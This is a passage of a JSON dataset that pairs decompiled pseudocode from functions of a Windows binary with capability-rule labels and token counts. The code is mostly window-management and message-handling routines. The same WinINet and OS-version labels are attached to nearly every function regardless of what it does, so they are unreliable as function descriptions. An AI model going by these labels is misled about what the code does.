        "token_count": 111
    },
    "0045ba6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045ba6c(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x485b48 + 0xa5) == '\\0') {\n        if (*0x485b60 == 0) {\n            uStack8 = 0x45ba89;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.0045ba28;\n            uStack20 = 3;\n            *0x485b60 = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x485b5c == 0) {\n            *0x485b5c = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x485b64 == 0) {\n            *0x485b64 = sub.kernel32.dll_CreateThread(0, 1000, fcn.0045b9cc, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 255
    },
    "0045bae0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.0045bae0(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x485b60 != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x485b60);\n    }\n    *0x485b60 = 0;\n    if (*0x485b64 != 0) {\n        sub.kernel32.dll_SetEvent(*0x485b5c);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x485b58) {\n            sub.kernel32.dll_WaitForSingleObject(*0x485b64, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle(*0x485b64);\n        *0x485b64 = 0;\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "0045bb3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.0045bb3c(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 136
    },
    "0045bb6c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bb6c(void)\n\n{\n    char in_AL;\n    uint uStack8;\n    int32_t iStack4;\n    \n    uStack8 = 8;\n    iStack4 = -(in_AL != '\\0');\n    sub.user32.dll_SystemParametersInfoA(0x49, 8, &uStack8, 0);\n    return;\n}\n",
        "token_count": 82
    },
    "0045bbd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.0045bbd4(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    code **ppcVar2;\n    code *in_EAX;\n    uint uVar3;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint lpFilename;\n    uchar *var_8h;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0042273c();\n    ppcVar2 = *0x48459c;\n    if (*(*0x48459c + 2) == 0) {\n        (*0x48459c)[1] = in_EAX;\n        *ppcVar2 = fcn.0045d374;\n    }\n    ppcVar2 = *0x484694;\n    if (*(*0x484694 + 2) == 0) {\n        (*0x484694)[1] = in_EAX;\n        *ppcVar2 = fcn.0045d56c;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 0x90) = uVar3;\n    uVar3 = fcn.004037f0();\n    *(in_EAX + 0xa8) = uVar3;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0x9d] = 0x1;\n    in_EAX[0xb4] = 0x1;\n    uVar3 = fcn.0042cc98();\n    *(in_EAX + 0x98) = uVar3;\n    sub.user32.dll_LoadIconA(**0x484458, 0x45bdc8);\n    fcn.0042d068();\n    iVar1 = *(in_EAX + 0x98);\n    *(iVar1 + 0x14) = in_EAX;\n    *(iVar1 + 0x10) = 0x45dbbc;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x484458, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    var_8h = fcn.0040d728();\n    if (var_8h != NULL) {\n        fcn.004092c8();\n    }\n    var_8h = fcn.0040d770();\n    if (var_8h != NULL) {\n        *var_8h = 0;\n    }\n    uVar3 = sub.user32.dll_CharNextA_1(&lpFilename);\n    sub.user32.dll_CharLowerA();\n    fcn.00404838();\n    if (**0x4842cc == '\\0') {\n        fcn.0045bef0();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0x9e] = 0x1;\n    *(in_EAX + 0xa0) = 0;\n    fcn.0045dd98();\n    fcn.0045e780();\n    if (var_1h != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uVar3;\n    }\n    return in_EAX;\n}\n",
        "token_count": 947
    },
    "0045bef0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bef0(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x45c091;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xa4) == '\\0') && (**0x4846fc == '\\0')) {\n        uVar2 = fcn.00423e04(fcn.0045c470, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x483ef8 = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x485668, *0x483f18, &fcn.0045bef0::lpWndClass);\n        if (iVar3 == 0) {\n            *0x483f04 = *0x485668;\n            iVar1 = sub.user32.dll_RegisterClassA(0x483ef4);\n            if (iVar1 == 0) {\n                fcn.0040675c();\n                fcn.0040c8dc();\n                fcn.00403fc0();\n            }\n        }\n        uVar4 = (***0x484484)(0);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x484484)(1, iVar3);\n        uVar2 = *0x485668;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.00404a88();\n        uVar2 = fcn.0040768c(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030);\n        *(in_EAX + 0x30) = uVar2;\n        fcn.004045c8();\n        *(in_EAX + 0xa4) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x484538 != '\\0') {\n            fcn.0045cb70();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x45c02a;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x45c031;\n            uStack12 = fcn.0045cb70();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x45c03d;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x45c048;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x45c057;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x45c064;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x484538 != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x45c098;\n    uStack60 = 0x45c090;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 1008
    },
    "0045c100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c100(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    iVar1 = func_0x00407304(arg_8h, 4);\n    if (iVar1 == *(*0x485b48 + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x485b48 + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.0044407c(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.0041c358();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 236
    },
    "0045c170": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c170(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    uint uStack16;\n    uchar uStack12;\n    \n    if (*(*0x485b48 + 0x30) != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            uStack16 = *(in_EAX + 0x30);\n            pcVar4 = fcn.0045c100;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.0045c100, &uStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = func_0x00407304(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.0041c4c8(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 397
    },
    "0045c220": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c220(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xb8) = *(in_EAX + 0xb8) + 1;\n    if ((*(in_EAX + 0xb8) == 1) && (*(in_EAX + 0xe2) != 0)) {\n        (**(in_EAX + 0xe0))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0045c24c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c24c(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xb8) = *(in_EAX + 0xb8) + -1;\n    if ((*(in_EAX + 0xb8) == 0) && (*(in_EAX + 0xea) != 0)) {\n        (**(in_EAX + 0xe8))();\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "0045c288": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c288(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(*0x485b48 + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.0041c4c8(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 226
    },
    "0045c2f4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045c2f4(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "0045c30c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045c30c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (*(in_EAX + 0x34) == '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 69
    },
    "0045c324": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045c324(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x485b54) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040da1c();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.0045b2cc();\n        }\n        if (*param_2 == *0x485b54) {\n            fcn.0045b914();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 167
    },
    "0045c37c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c37c(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x45c3d9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x13a) != 0) {\n        fcn.004047c0();\n        (**(in_EAX + 0x138))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45c3e0;\n    uStack24 = 0x45c3d8;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 218
    },
    "0045c470": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c470(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *in_FS_OFFSET;\n    uint noname_0;\n    uint uVar8;\n    uchar *arg_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = &stack0xfffffffc;\n    uVar8 = 0x45cb27;\n    noname_0 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    param_2[3] = 0;\n    iVar7 = *(*(in_EAX + 0xa8) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar7 + -1) {\n        do {\n            arg_10h = puVar1;\n            ppcVar3 = fcn.0041c4c8();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = noname_0;\n                return;\n            }\n            iVar7 = iVar7 + -1;\n            puVar1 = arg_10h;\n        } while (iVar7 != 0);\n    }\n    fcn.0045c324();\n    iVar7 = *param_2;\n    if (0x53 < iVar7) {\n        if (iVar7 < 0xb018) {\n            if (iVar7 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar7 = fcn.0044407c(),  iVar7 != 0)) {\n                    uVar8 = fcn.0044407c();\n                    iVar7 = sub.user32.dll_IsWindowEnabled(uVar8);\n                    if (iVar7 != 0) {\n                        uVar8 = fcn.0044407c();\n                        iVar7 = sub.user32.dll_IsWindowVisible(uVar8);\n                        if (iVar7 != 0) {\n                            *0x483e10 = 0;\n                            uVar8 = sub.user32.dll_GetFocus();\n                            uVar6 = fcn.0044407c();\n                            sub.user32.dll_SetFocus(uVar6);\n                            fcn.0043e9fc(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar8);\n                            *0x483e10 = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x0045cb1d;\n            }\n            if (iVar7 < 0xb001) {\n                if (iVar7 == 0xb000) {\n                    if (*(in_EAX + 0x112) != 0) {\n                        (**(in_EAX + 0x110))();\n                    }\n                    goto code_r0x0045cb1d;\n                }\n                if (iVar7 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.0045cb8c();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.0045cc3c();\n                    }\n                    else {\n                        fcn.0045c3e8(&stack0xfffffffc);\n                    }\n                    goto code_r0x0045cb1d;\n                }\n                if (iVar7 - 0x132U < 7) {\n                    iVar7 = sub.user32.dll_SendMessageA(param_2[2], iVar7 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar7;\n                    goto code_r0x0045cb1d;\n                }\n                if (iVar7 - 0x132U == 0x1e8) {\n                    fcn.00430404();\n                    cVar2 = fcn.0043050c();\n                    if (cVar2 != '\\0') {\n                        fcn.00430404();\n                        fcn.00430568();\n                    }\n                    goto code_r0x0045cb1d;\n                }\n            }\n            else {\n                if (iVar7 == 0xb001) {\n                    if (*(in_EAX + 0x10a) != 0) {\n                        (**(in_EAX + 0x108))();\n                    }\n                    goto code_r0x0045cb1d;\n                }\n                if (iVar7 == 0xb016) {\n                    cVar2 = fcn.0045cfb4();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x0045cb1d;\n                }\n            }\n        }\n        else if (iVar7 < 0xb021) {\n            if (iVar7 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.0045d0f4(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.0045d150(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x0045cb1d;\n            }\n            if (iVar7 == 0xb01a) {\n                iVar7 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n                if (((iVar7 == 0) && (iVar7 = sub.user32.dll_GetFocus(),  iVar7 == *(in_EAX + 0x30))) &&\n                   (iVar7 = fcn.00454248(),  iVar7 != 0)) {\n                    sub.user32.dll_SetFocus(iVar7);\n                }\n                goto code_r0x0045cb1d;\n            }\n            if (iVar7 == 0xb01f) goto code_r0x0045ca3c;\n        }\n        else {\n            if (iVar7 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb0);\n                }\n                else {\n                    *(in_EAX + 0xb0) = param_2[2];\n                }\n                goto code_r0x0045cb1d;\n            }\n            if (iVar7 - 0xb03fU < 2) {\n                uVar5 = fcn.0045e644();\n                param_2[3] = uVar5 & 0x7f;\n                goto code_r0x0045cb1d;\n            }\n        }\n        goto code_r0x0045cb16;\n    }\n    if (iVar7 == 0x53) {\ncode_r0x0045ca3c:\n        fcn.0045d644();\n        goto code_r0x0045cb1d;\n    }\n    if (iVar7 < 0x17) {\n    // switch table (21 cases) at 0x45c514\n        switch(iVar7) {\n        case 0:\n            fcn.0042259c();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 5:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n        case 0x11:\n        case 0x12:\n        case 0x13:\n            goto code_r0x0045cb16;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.0045c3e8(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.0045c3e8(&stack0xfffffffc);\n                if (*(in_EAX + 0xac) == 0) {\n                    uVar8 = fcn.004540e0();\n                    *(in_EAX + 0xac) = uVar8;\n                }\n                fcn.0045c280();\n            }\n            else {\n                fcn.0045c288();\n                if (*(in_EAX + 0xac) != 0) {\n                    fcn.00454194();\n                    *(in_EAX + 0xac) = 0;\n                }\n                fcn.0045c3e8(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar7 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n            if (iVar7 == 0) {\n                fcn.0045c3e8(&stack0xfffffffc);\n            }\n            else {\n                fcn.0045c424(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.00459ae8();\n            }\n            break;\n        case 0x14:\n            *param_2 = 0x27;\n            fcn.0045c3e8(&stack0xfffffffc);\n            break;\n        default:\n            if (param_2[1] != 0) {\n                fcn.004044d0(noname_0, uVar8, arg_10h);\n            }\n        }\n    }\n    else {\n        if (iVar7 < 0x1e) {\n            if (iVar7 == 0x1d) {\n                fcn.0045b914();\n                fcn.0045c3e8(&stack0xfffffffc);\n                goto code_r0x0045cb1d;\n            }\n            if (iVar7 == 0x1a) {\n                fcn.00448a24();\n                fcn.0045c37c();\n                fcn.0045c3e8(&stack0xfffffffc);\n                goto code_r0x0045cb1d;\n            }\n            if (iVar7 == 0x1c) {\n                fcn.0045c3e8(&stack0xfffffffc);\n                *(in_EAX + 0x9d) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.0045c278();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.0045c288();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x0045cb1d;\n            }\n        }\n        else {\n            if (iVar7 == 0x37) {\n                iVar7 = fcn.0045cb70();\n                param_2[3] = iVar7;\n                goto code_r0x0045cb1d;\n            }\n            if (iVar7 == 0x4a) {\n                if ((*param_2[2] == -0x21acbbac) && (*(in_EAX + 0x9e) != '\\0')) {\n                    if (*(in_EAX + 0xa0) == 0) {\n                        iVar7 = fcn.0040e6fc();\n                        *(in_EAX + 0xa0) = iVar7;\n                        if (iVar7 == 0) {\n                            iVar7 = sub.kernel32.dll_GetLastError();\n                            param_2[3] = iVar7;\n                            *(in_EAX + 0xa0) = 0;\n                        }\n                        else {\n                            param_2[3] = 0;\n                            pcVar4 = sub.kernel32.dll_GetProcAddress_1(*(in_EAX + 0xa0), 0x45cb5c);\n                            if (pcVar4 != NULL) {\n                                (*pcVar4)(*(param_2[2] + 4), *(param_2[2] + 8));\n                            }\n                        }\n                    }\n                    else {\n                        param_2[3] = 0;\n                    }\n                }\n                goto code_r0x0045cb1d;\n            }\n        }\ncode_r0x0045cb16:\n        fcn.0045c3e8(&stack0xfffffffc);\n    }\ncode_r0x0045cb1d:\n    *in_FS_OFFSET = noname_0;\n    return;\n}\n",
        "token_count": 2786
    },
    "0045cb8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045cb8c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n    if (iVar1 != 0) {\n        return;\n    }\n    fcn.0045c278();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar2 = fcn.0044407c();\n        iVar1 = sub.user32.dll_IsWindowEnabled(uVar2);\n        if (iVar1 != 0) {\n            iVar1 = *(in_EAX + 0x44);\n            uVar2 = fcn.0044407c(*(iVar1 + 0x40), *(iVar1 + 0x44), *(iVar1 + 0x48), 0, 0x40);\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar2);\n            sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            goto code_r0x0045cc21;\n        }\n    }\n    fcn.0045bb94();\ncode_r0x0045cc21:\n    if (*(in_EAX + 0x11a) != 0) {\n        (**(in_EAX + 0x118))();\n    }\n    return;\n}\n",
        "token_count": 379
    },
    "0045cc3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
